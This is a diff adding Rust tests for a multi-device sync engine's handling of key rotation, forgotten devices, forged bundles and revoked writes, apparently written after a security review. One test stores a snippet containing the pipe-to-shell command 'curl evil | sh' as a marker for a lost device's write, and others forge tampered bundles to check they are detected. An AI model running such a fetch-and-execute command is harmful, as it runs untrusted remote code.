@@ -2270,3 +2270,539 @@ async fn restored_old_bundle_never_makes_a_device_publish_under_old_dk() {
         assert!(epoch >= 2, "{key} published under epoch {epoch}");
     }
 }
+
+// ── S2a security review fixes (agent-security, on 8f3bf96..4764938) ───────
+
+/// MOYEN-1: taking the other lineage's keys at the same epoch applies the
+/// same provenance rule as an adoption (R3).
+#[tokio::test]
+async fn use_other_same_epoch_holds_forgotten_writes() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let c = device(&sim);
+    let l = device(&sim);
+    create(&a, &folder).await;
+    join_named(&c, &folder, "Cee", STRONG).await;
+    join_named(&l, &folder, "Lost", STRONG).await;
+    for d in [&a, &c, &l, &a, &c] {
+        sync(d).await;
+    }
+    // L writes; C merges it; A never sees it before forgetting L.
+    let l_previous = sim
+        .with(|st| st.files.get(&snap_key(&l)).cloned())
+        .expect("l");
+    l.engine
+        .save_snippet(snippet("From L", "curl evil | sh"))
+        .await
+        .expect("s");
+    sync(&l).await;
+    sync(&c).await;
+    let l_new = sim
+        .with(|st| st.files.get(&snap_key(&l)).cloned())
+        .expect("l");
+    put_file(&sim, &snap_key(&l), l_previous);
+    let old = folder_bundle(&sim);
+    let c_previous = sim
+        .with(|st| st.files.get(&snap_key(&c)).cloned())
+        .expect("c");
+    forget(&a, vec![id_of(&l)], STRONG, STRONG_2).await;
+    // C rotates concurrently (it does not see A's rotation yet).
+    let a_bundle = folder_bundle(&sim);
+    let a_snap = take_file(&sim, &snap_key(&a));
+    put_file(&sim, "bundle.toml", old.into_bytes());
+    put_file(&sim, &snap_key(&c), c_previous);
+    put_file(&sim, &snap_key(&l), l_new);
+    rotate(&c, STRONG, STRONG_3).await;
+    put_file(&sim, &snap_key(&a), a_snap);
+    put_file(&sim, "bundle.toml", a_bundle.into_bytes());
+    assert_eq!(code(c.engine.sync_now().await), "sync_rotation_conflict");
+    c.engine
+        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_2)))
+        .await
+        .expect("use A's keys");
+    let held = c.engine.sync_revoked_values().await.expect("held");
+    assert!(
+        held.iter().any(|item| item
+            .device
+            .as_deref()
+            .is_some_and(|d| d.starts_with("Lost ("))),
+        "{held:?}"
+    );
+    c.engine
+        .save_snippet(snippet("C after", "true"))
+        .await
+        .expect("s");
+    sync(&c).await;
+    sync(&a).await;
+    let status = sync(&a).await;
+    assert!(
+        !matches!(
+            status,
+            SyncStatus::Alert {
+                kind: AlertKind::RevokedWrites,
+                ..
+            } | SyncStatus::Waiting {
+                reason: WaitReason::Deferred,
+                ..
+            }
+        ),
+        "{status:?}"
+    );
+    let names: BTreeSet<String> = a
+        .engine
+        .snippets()
+        .await
+        .expect("s")
+        .into_iter()
+        .map(|s| s.name)
+        .collect();
+    assert!(names.contains("C after"), "{names:?}");
+    assert!(!names.contains("From L"), "never laundered: {names:?}");
+}
+
+/// MOYEN-2: a "don't remember" device stays unlocked from one pass to the
+/// next (its first commitment, a re-join).
+#[tokio::test]
+async fn dont_remember_stays_unlocked_across_passes() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let b = device(&sim);
+    a.engine
+        .sync_create(SyncCreate {
+            folder: folder.clone(),
+            passphrase: typed(STRONG),
+            device_name: "Laptop".into(),
+            remember_key: false,
+        })
+        .await
+        .expect("create");
+    let preview = b
+        .engine
+        .sync_join_preview(SyncJoin {
+            folder: folder.clone(),
+            passphrase: secret(STRONG),
+            device_name: "Desktop".into(),
+            remember_key: false,
+        })
+        .await
+        .expect("preview");
+    b.engine
+        .sync_join_commit(preview.token, JoinBulkChoice::ReviewEach)
+        .await
+        .expect("join");
+    for device in [&a, &b] {
+        for _ in 0..2 {
+            let status = sync(device).await;
+            assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
+        }
+    }
+    // A re-join (unreadable replica: a new id) keeps it unlocked too.
+    let before = id_of(&b);
+    std::fs::write(b.paths.sync_dir().join("replica.snap"), b"torn").expect("w");
+    let _ = b.engine.sync_now().await;
+    assert_ne!(id_of(&b), before, "re-joined");
+    for _ in 0..2 {
+        let status = sync(&b).await;
+        assert!(matches!(status, SyncStatus::Idle { .. }), "{status:?}");
+    }
+}
+
+/// FAIBLE-1: "don't remember" also forgets the key of a pending rotation.
+#[tokio::test]
+async fn dont_remember_during_pending_rotation_leaves_no_key() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let b = device(&sim);
+    create(&a, &folder).await;
+    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
+    let bundle = bundle_id(&a);
+    sim.with(|st| st.fail_writes.push(("bundle.toml".to_owned(), false)));
+    let outcome = rotate(&a, STRONG, STRONG_2).await;
+    assert!(matches!(
+        outcome.status,
+        SyncStatus::Waiting {
+            reason: WaitReason::RotationPending,
+            ..
+        }
+    ));
+    a.engine
+        .sync_set_options(SyncOptions {
+            remember_key: false,
+        })
+        .await
+        .expect("options");
+    assert!(!has_key(&a, &bundle, 2), "the next key is forgotten too");
+    assert!(!has_key(&a, &bundle, 1));
+    // The transition still completes with the keys in memory.
+    let _ = a.engine.sync_now().await;
+    assert_eq!(epoch_of(&a), 2);
+    assert!(!has_key(&a, &bundle, 2));
+    let restarted = restart(&a, &sim);
+    assert_eq!(
+        restarted
+            .sync_now()
+            .await
+            .expect_err("locked")
+            .summary()
+            .code,
+        "sync_locked"
+    );
+}
+
+/// FAIBLE-2: after a re-join of unknown origin, nobody waits for the
+/// former id forever.
+#[tokio::test]
+async fn unknown_origin_rejoin_leaves_no_ghost_waiting() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let s = device(&sim);
+    create(&a, &folder).await;
+    join_named(&s, &folder, "Stale", STRONG).await;
+    sync(&a).await;
+    sync(&s).await;
+    let former = id_of(&s);
+    s.engine
+        .sync_set_options(SyncOptions {
+            remember_key: false,
+        })
+        .await
+        .expect("options");
+    let s = Device {
+        engine: restart(&s, &sim),
+        ..s
+    };
+    rotate(&a, STRONG, STRONG_2).await;
+    let _ = unlock(&s, STRONG_2).await;
+    assert_ne!(id_of(&s), former, "re-joined (no previous key)");
+    for _ in 0..2 {
+        let _ = s.engine.sync_now().await;
+        let _ = a.engine.sync_now().await;
+    }
+    for device in [&a, &s] {
+        let status = sync(device).await;
+        assert!(
+            matches!(status, SyncStatus::Idle { .. }),
+            "{status:?} a={} s={} former={former} files={:?}",
+            id_of(&a),
+            id_of(&s),
+            sim.with(|st| st.files.keys().cloned().collect::<Vec<_>>())
+        );
+    }
+    let text = folder_bundle(&sim);
+    let opened = bundle::open(&text, &secret(STRONG_2), &KdfBounds::TEST).expect("open");
+    assert!(
+        opened
+            .roster
+            .revoked
+            .iter()
+            .any(|entry| entry.id.to_string() == former),
+        "the former id is retired"
+    );
+    assert!(sim.with(|st| !st.files.contains_key(&format!("devices/{former}.snap"))));
+}
+
+/// FAIBLE-3: a same-epoch file nobody of this lineage could write is what
+/// "restore" is for.
+#[tokio::test]
+async fn restore_bundle_overwrites_unauthenticated_same_epoch_file() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    create(&a, &folder).await;
+    rotate(&a, STRONG, STRONG_2).await;
+    let genuine = folder_bundle(&sim);
+    let clear = bundle::peek(&genuine).expect("peek");
+    // Same epoch, another commitment, links nobody can prove.
+    let (forged, _) = bundle::tests::forge(
+        clear.bundle_id,
+        2,
+        9,
+        bundle::Roster::default(),
+        vec![random_link(1)],
+        vec![(1, random_key())],
+        None,
+        STRONG,
+    );
+    put_file(&sim, "bundle.toml", forged.into_bytes());
+    assert_eq!(code(a.engine.sync_now().await), "sync_bundle_tampered");
+    a.engine.sync_restore_bundle().await.expect("restore");
+    assert_eq!(folder_bundle(&sim), genuine);
+}
+
+/// FAIBLE-3: a newer file forged from a pending transition's own lineage
+/// is rewritten, and the transition completes.
+#[tokio::test]
+async fn pending_transition_survives_forged_higher_epoch_bundle() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    create(&a, &folder).await;
+    let id_bytes = bundle::peek(&folder_bundle(&sim)).expect("p").bundle_id;
+    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
+    rotate(&a, STRONG, STRONG_2).await;
+    let next = std::fs::read_to_string(a.paths.sync_dir().join("bundle.next")).expect("next");
+    let next_clear = bundle::peek(&next).expect("peek");
+    // Epoch 3 with a link from the pending epoch's commitment and a
+    // false proof.
+    let mut links = next_clear.links.clone();
+    links.push(bundle::LineageLink {
+        epoch: 2,
+        digest: next_clear.commit.expect("v2"),
+        proof: [4; 32],
+    });
+    let (forged, _) = bundle::tests::forge(
+        id_bytes,
+        3,
+        1,
+        bundle::Roster::default(),
+        links,
+        vec![(1, random_key()), (2, random_key())],
+        None,
+        STRONG,
+    );
+    put_file(&sim, "bundle.toml", forged.into_bytes());
+    let _ = a.engine.sync_now().await;
+    assert_eq!(epoch_of(&a), 2, "the transition completed");
+    assert_eq!(folder_epoch(&sim), 2, "the forged file was rewritten");
+}
+
+/// FAIBLE-3: an authentic fork at N + 2 is never restored over, even when
+/// the status does not show the conflict yet.
+#[tokio::test]
+async fn restore_refused_for_an_authentic_fork_even_when_idle() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    create(&a, &folder).await;
+    let epoch_n = folder_bundle(&sim);
+    rotate(&a, STRONG, STRONG_2).await;
+    assert!(!matches!(sync(&a).await, SyncStatus::Alert { .. }));
+    // Another holder of DK_N rotates twice from N (a fork at N + 2).
+    let n = bundle::open(&epoch_n, &secret(STRONG), &KdfBounds::TEST).expect("open");
+    let (_, fork_1) = bundle::rotate(
+        &n,
+        &typed(STRONG_3),
+        n.roster.clone(),
+        KdfBounds::TEST_PARAMS,
+        &KdfBounds::TEST,
+    )
+    .expect("fork 1");
+    let (fork_2, _) = bundle::rotate(
+        &fork_1,
+        &typed(STRONG_4),
+        n.roster.clone(),
+        KdfBounds::TEST_PARAMS,
+        &KdfBounds::TEST,
+    )
+    .expect("fork 2");
+    put_file(&sim, "bundle.toml", fork_2.clone().into_bytes());
+    let error = a.engine.sync_restore_bundle().await.expect_err("refused");
+    assert_eq!(error.summary().code, "sync_rotation_conflict");
+    assert_eq!(folder_bundle(&sim), fork_2);
+}
+
+/// FAIBLE-4: the other keys never take the floor lower, and the choices
+/// need a current conflict.
+#[tokio::test]
+async fn use_other_never_lowers_the_floor() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let c = device(&sim);
+    create(&a, &folder).await;
+    join(&c, &folder, JoinBulkChoice::ReviewEach).await;
+    // A's rotation waits; C's lands: a conflict at epoch 2.
+    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
+    rotate(&a, STRONG, STRONG_2).await;
+    rotate(&c, STRONG, STRONG_3).await;
+    assert_eq!(code(a.engine.sync_now().await), "sync_rotation_conflict");
+    // A keeps its keys (epoch 3), and that write waits too: floor 3.
+    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
+    let status = a
+        .engine
+        .sync_resolve_rotation_conflict(RotationChoice::KeepMine {
+            new_passphrase: typed(STRONG_4),
+            remember_key: true,
+        })
+        .await
+        .expect("keep mine");
+    assert!(matches!(
+        status,
+        SyncStatus::Waiting {
+            reason: WaitReason::RotationPending,
+            ..
+        }
+    ));
+    // C's epoch-2 file is below A's floor: never taken.
+    let error = a
+        .engine
+        .sync_resolve_rotation_conflict(RotationChoice::UseOther(secret(STRONG_3)))
+        .await
+        .expect_err("below the floor");
+    assert!(
+        ["sync_not_pending", "sync_rollback"].contains(&error.summary().code.as_str()),
+        "{error:?}"
+    );
+    let _ = a.engine.sync_now().await;
+    assert_eq!(epoch_of(&a), 3);
+    assert_eq!(folder_epoch(&sim), 3);
+}
+
+#[tokio::test]
+async fn keep_mine_refused_without_conflict() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    create(&a, &folder).await;
+    for choice in [
+        RotationChoice::KeepMine {
+            new_passphrase: typed(STRONG_2),
+            remember_key: true,
+        },
+        RotationChoice::UseOther(secret(STRONG)),
+    ] {
+        let error = a
+            .engine
+            .sync_resolve_rotation_conflict(choice)
+            .await
+            .expect_err("no conflict");
+        assert_eq!(error.summary().code, "sync_not_pending");
+    }
+    assert_eq!(epoch_of(&a), 1);
+    assert_eq!(folder_epoch(&sim), 1);
+}
+
+/// FAIBLE-5: the re-join `sync_lineage_unknown` points to never takes a
+/// grouped choice, and every local difference waits for a decision.
+#[tokio::test]
+async fn lineage_unknown_rejoin_holds_every_local_difference() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let b = device(&sim);
+    a.engine
+        .save_snippet(snippet("Shared", "uptime"))
+        .await
+        .expect("s");
+    create(&a, &folder).await;
+    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
+    // B loses its record of the current keys and its key.
+    b.engine
+        .sync_set_options(SyncOptions {
+            remember_key: false,
+        })
+        .await
+        .expect("options");
+    std::fs::remove_file(b.paths.sync_dir().join("commitment.toml")).expect("rm");
+    let b = Device {
+        engine: restart(&b, &sim),
+        ..b
+    };
+    rotate(&a, STRONG, STRONG_2).await;
+    assert_eq!(code(unlock(&b, STRONG_2).await), "sync_lineage_unknown");
+    // As the hint says: turn sync off, join again.
+    b.engine
+        .sync_disable(DisableOptions::default())
+        .await
+        .expect("disable");
+    b.engine
+        .save_snippet(snippet("Only B", "id"))
+        .await
+        .expect("s");
+    let preview = b
+        .engine
+        .sync_join_preview(SyncJoin {
+            folder: folder.clone(),
+            passphrase: secret(STRONG_2),
+            device_name: "Desktop".into(),
+            remember_key: true,
+        })
+        .await
+        .expect("preview");
+    assert!(preview.rejoin);
+    let refused = b
+        .engine
+        .sync_join_commit(preview.token, JoinBulkChoice::PreferLocal)
+        .await
+        .expect_err("grouped choice");
+    assert_eq!(refused.summary().code, "sync_resolution_invalid");
+    let preview = b
+        .engine
+        .sync_join_preview(SyncJoin {
+            folder: folder.clone(),
+            passphrase: secret(STRONG_2),
+            device_name: "Desktop".into(),
+            remember_key: true,
+        })
+        .await
+        .expect("preview");
+    b.engine
+        .sync_join_commit(preview.token, JoinBulkChoice::ReviewEach)
+        .await
+        .expect("join");
+    sync(&b).await;
+    let held = b.engine.sync_revoked_values().await.expect("held");
+    assert_eq!(held.len(), 1, "only the difference waits: {held:?}");
+    assert!(held.iter().all(|item| item.device.is_none()));
+    sync(&a).await;
+    assert!(
+        a.engine
+            .snippets()
+            .await
+            .expect("s")
+            .iter()
+            .all(|s| s.name != "Only B"),
+        "not published without a decision"
+    );
+}
+
+/// FAIBLE-6: the observed `revoked_clock` bounds this pass even when the
+/// corrective rewrite fails.
+#[tokio::test]
+async fn observed_revoked_clock_is_used_even_if_rewrite_fails() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let b = device(&sim);
+    let l = device(&sim);
+    create(&a, &folder).await;
+    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
+    join_named(&l, &folder, "Lost", STRONG).await;
+    sync(&a).await;
+    let l_id = id_of(&l);
+    forget(&a, vec![l_id.clone()], STRONG, STRONG_2).await;
+    unlock(&b, STRONG_2).await.expect("adopt");
+    let text = folder_bundle(&sim);
+    let opened = bundle::open(&text, &secret(STRONG_2), &KdfBounds::TEST).expect("open");
+    let bound = opened
+        .roster
+        .revoked
+        .iter()
+        .find(|e| e.id.to_string() == l_id)
+        .map(|e| e.revoked_clock)
+        .expect("forgotten");
+    // A key holder raises L's bound in a new revision; A's corrective
+    // rewrite then fails.
+    let mut roster = opened.roster.clone();
+    if let Some(entry) = roster.revoked.iter_mut().find(|e| e.id.to_string() == l_id) {
+        entry.revoked_clock = bound + 100;
+    }
+    let (tampered, _) = bundle::with_roster(&opened, roster).expect("roster");
+    put_file(&sim, "bundle.toml", tampered.into_bytes());
+    sim.with(|st| st.fail_writes.push(("bundle.toml".into(), false)));
+    let b_id = crate::sync::DeviceId::from_hex(&id_of(&b)).expect("id");
+    forge_snapshot_as(
+        &sim,
+        STRONG_2,
+        b_id,
+        1000,
+        50,
+        &format!(
+            r#"{{"context":{{"{b_id}":50,"{l_id}":{}}},"records":[]}}"#,
+            bound + 1
+        ),
+    );
+    let _ = a.engine.sync_now().await;
+    let codes = issue_codes(&a.engine.sync_issues().await.expect("issues"));
+    assert!(
+        codes.contains(&"sync_bundle_tampered".to_owned()),
+        "{codes:?}"
+    );
+    assert!(
+        codes.contains(&"sync_revoked_writes".to_owned()),
+        "{codes:?}"
+    );
+}
